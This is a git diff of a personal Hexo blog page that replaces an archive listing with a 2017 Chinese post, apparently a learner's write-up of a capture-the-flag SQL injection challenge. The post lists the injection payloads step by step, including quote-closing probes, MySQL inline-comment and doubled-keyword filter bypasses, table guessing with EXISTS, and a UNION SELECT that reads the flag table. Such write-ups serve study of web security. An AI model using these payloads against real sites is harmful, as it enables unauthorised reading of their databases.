@@ -77,7 +77,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="sql," />
 
 
 
@@ -93,15 +93,17 @@
 
 
 
-<meta name="description" content="Love life , love gakki !">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Merl1ng">
-<meta property="og:url" content="http://Merl1ng.com/archives/2017/04/index.html">
+<meta name="description" content="正在学习sql注入 差不多完整理解了一道注入题把方法和思路记录下来(&amp;gt;ω&amp;lt;)">
+<meta name="keywords" content="sql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一道sql注入">
+<meta property="og:url" content="http://Merl1ng.com/2017/08/02/一道sql注入/index.html">
 <meta property="og:site_name" content="Merl1ng">
-<meta property="og:description" content="Love life , love gakki !">
+<meta property="og:description" content="正在学习sql注入 差不多完整理解了一道注入题把方法和思路记录下来(&amp;gt;ω&amp;lt;)">
+<meta property="og:updated_time" content="2017-08-03T13:29:56.567Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Merl1ng">
-<meta name="twitter:description" content="Love life , love gakki !">
+<meta name="twitter:title" content="一道sql注入">
+<meta name="twitter:description" content="正在学习sql注入 差不多完整理解了一道注入题把方法和思路记录下来(&amp;gt;ω&amp;lt;)">
 
 
 
@@ -129,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="http://Merl1ng.com/archives/2017/04/"/>
+  <link rel="canonical" href="http://Merl1ng.com/2017/08/02/一道sql注入/"/>
 
 
 
 
 
-  <title>Archive | Merl1ng</title>
+  <title>一道sql注入 | Merl1ng</title>
   
 
 
@@ -160,7 +162,7 @@
     
   
 
-  <div class="container sidebar-position-left  page-archive  ">
+  <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -254,103 +256,186 @@
           <div id="content" class="content">
             
 
-  <section id="posts" class="posts-collapse">
-    <span class="archive-move-on"></span>
-
-    <span class="archive-page-counter">
-      
-      
-      
-        
-      
-      Um..! 14 posts in total. Keep on posting.
-    </span>
-
+  <div id="posts" class="posts-expand">
     
-
-      
-      
-      
-
-      
-        
-        <div class="collection-title">
-          <h2 class="archive-year motion-element" id="archive-year-2017">2017</h2>
-        </div>
-      
-      
-
-      
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/04/30/环境变量/" itemprop="url">
-              
-                <span itemprop="name">环境变量</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-04-30T23:10:52+08:00"
-              content="2017-04-30" >
-          04-30
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-    
-
-      
-      
-      
-
-      
-      
-
-      
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/04/12/hello-world/" itemprop="url">
-              
-                <span itemprop="name">Hello World</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-04-12T23:50:25+08:00"
-              content="2017-04-12" >
-          04-12
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-    
-
-  </section>
 
   
 
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/08/02/一道sql注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Saber">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Merl1ng">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">一道sql注入</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-02T22:56:28+08:00">
+                2017-08-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>正在学习sql注入 差不多完整理解了一道注入题<br>把方法和思路记录下来(&gt;ω&lt;)<br><a id="more"></a><br>首先提交1 即?id=1 得到<br>ID: 1<br>name: baloteli</p>
+<p>提交1’ 报错  near ‘’1’’’<br>说明单引号影响了语句 且sql语句中id值两旁有 ‘ ‘ -&gt;要闭合单引号<br>网页中SELECT语句大致语法为 SELECT * FROM users WHERE id = ‘$id’</p>
+<p>然后提交 1’or ‘’=’<br>得到<br>ID: 1’ or ‘’=’<br>name: baloteli<br>ID: 1’ or ‘’=’<br>name: kanawaluo<br>ID: 1’ or ‘’=’<br>name: dengdeng<br>即分别提交 1 2 3 所显示的消息<br>并且可以得知 or没有被过滤</p>
+<p>试下and关键字<br>两种写法 (为了闭合单引号) (两种写法只做一个简单的比较)<br><code>1&#39; and &#39;1&#39;=&#39;1</code> 没反应<br><code>1&#39; and 1=1 or&#39;&#39;=&#39;</code> 报错<br>第一种更简洁 但是第二种回显效果更好<br>说明and被过滤</p>
+<p><code>1&#39; /*and*/ &#39;1&#39;=&#39;1</code><br><code>1&#39; /*and*/ 1=1 or&#39;&#39;=&#39;</code><br>均同上 说明还是不行 and被过滤</p>
+<p><code>1&#39; /*!and*/ &#39;1&#39;=&#39;1</code>只回显了id为1的值<br><code>1&#39; /*!and*/ 1=1 or&#39;&#39;=&#39;</code> 回显了id为1 2 3的值<br>成功绕过</p>
+<p>猜表名<br><code>?id=&#39; or /*!exists*/ (/*!select*/ * /*!from*/ admin) /*!and*/ &#39;&#39;=&#39;</code><br>报错Table ‘web10.admin’ doesn’t exist<br>换flag猜下<br><code>?id=&#39; or /*!exists*/ (/*!select*/ * /*!from*/ flag) /*!and*/ &#39;&#39;=&#39;</code><br>可以，那么就猜列名<br><code>?id=&#39; or /*!exists*/ (/*!select*/ id /*!from*/ flag) /*!and*/ &#39;&#39;=&#39;</code><br><code>?id=&#39; or /*!exists*/ (/*!select*/ name /*!from*/ flag) /*!and*/ &#39;&#39;=&#39;</code><br>都可以</p>
+<p>联合查询 加上<code>/*!where*/ &#39;&#39;=&#39;</code>是为了闭合单引号<br><code>?id=&#39; /*!union*/ /*!select*/ 1,2 /*!from*/ flag /*!where*/ &#39;&#39;=&#39;</code><br>报错The used SELECT statements have a different number of columns<br><code>?id=&#39; /*!union*/ /*!select*/ 1 /*!from*/ flag /*!where*/ &#39;&#39;=&#39;</code><br>可以 所以当前表只查找一列</p>
+<p><code>?id=&#39; /*!union*/ /*!select*/ name /*!from*/ flag /*!where*/ &#39;&#39;=&#39;</code><br>报错Unknown column ‘name’ in ‘field list’<br>这里比较奇怪 明明之前exists判断出有name列 结果这里联合就报没有这个name列</p>
+<p><em>实际这道题是过滤了关键字后紧挨空格的情况所以可以双写空格关键字绕过</em></p>
+<p>最终的查询语句为<br><code>&#39;unionunion  selectselect  flag fromfrom  flag wherewhere &#39;&#39;=&#39;</code><br>或者<br><code>&#39; /*!union*/ /*!select*/ flag /*!from*/ flag /*!where*/ &#39;&#39;=&#39;</code></p>
+<p>后记</p>
+<p>这个题还有比较奇怪的一点是不能用注释 注释掉后面的 ‘<br><code>&#39; /*!union*/ /*!select*/ flag /*!from*/ flag--</code><br><code>&#39; /*!union*/ /*!select*/ flag /*!from*/ flag--+</code><br><code>&#39; /*!union*/ /*!select*/ flag /*!from*/ flag#</code><br>都不行 可能也进行了过滤</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sql/" rel="tag"># sql</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/08/03/php结合sql注入/" rel="next" title="php结合sql注入">
+                <i class="fa fa-chevron-left"></i> php结合sql注入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/07/30/javascript伪协议与作用域/" rel="prev" title="javascript伪协议与作用域">
+                javascript伪协议与作用域 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -358,6 +443,10 @@
 
 
           
+  <div class="comments" id="comments">
+    
+  </div>
+
 
         </div>
         
@@ -574,11 +663,9 @@
   
 
   
-  
-    <script type="text/javascript" id="motion.page.archive">
-      $('.archive-year').velocity('transition.slideLeftIn');
-    </script>
-  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
 
 
   
